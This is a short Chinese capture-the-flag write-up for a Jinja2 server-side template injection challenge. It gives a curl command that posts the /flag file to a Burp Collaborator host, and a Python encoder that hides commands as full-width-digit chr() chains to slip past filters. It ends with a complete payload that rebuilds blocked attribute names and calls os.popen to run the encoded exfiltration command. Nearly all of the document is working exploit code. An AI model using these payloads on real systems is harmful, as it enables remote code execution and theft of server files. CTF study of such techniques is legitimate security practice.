# 知识点
使用curl进行外带
```python
curl -X POST -F xx=@/flag http://l5rvcu3v2r2mab2ufjfovmdtqkwck1.burpcollaborator.net
```
# 思路
```python
def half2full(half):
    full = ''
    for ch in half:
        if ord(ch) in range(33, 127):
            ch = chr(ord(ch) + 0xfee0)
        elif ord(ch) == 32:
            ch = chr(0x3000)
        else:
            pass
        full += ch
    return full
string = input("你要输入的字符串：")
result = ''
def str2chr(s):
    global  result
    for i in s:
        result += "chr("+half2full(str(ord(i)))+")%2b"
str2chr(string)
print(result[:-3])
```
```python
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set ohs=(dict(o=a,s=a)|join)%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(１０８)%2bchr(５３)%2bchr(１１４)%2bchr(１１８)%2bchr(９９)%2bchr(１１７)%2bchr(５１)%2bchr(１１８)%2bchr(５０)%2bchr(１１４)%2bchr(５０)%2bchr(１０９)%2bchr(９７)%2bchr(９８)%2bchr(５０)%2bchr(１１７)%2bchr(１０２)%2bchr(１０６)%2bchr(１０２)%2bchr(１１１)%2bchr(１１８)%2bchr(１０９)%2bchr(１００)%2bchr(１１６)%2bchr(１１３)%2bchr(１０７)%2bchr(１１９)%2bchr(９９)%2bchr(１０７)%2bchr(４９)%2bchr(４６)%2bchr(９８)%2bchr(１１７)%2bchr(１１４)%2bchr(１１２)%2bchr(９９)%2bchr(１１１)%2bchr(１０８)%2bchr(１０８)%2bchr(９７)%2bchr(９８)%2bchr(１１１)%2bchr(１１４)%2bchr(９７)%2bchr(１１６)%2bchr(１１１)%2bchr(１１４)%2bchr(４６)%2bchr(１１０)%2bchr(１０１)%2bchr(１１６)%}
{% if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc
{% endif %}
```
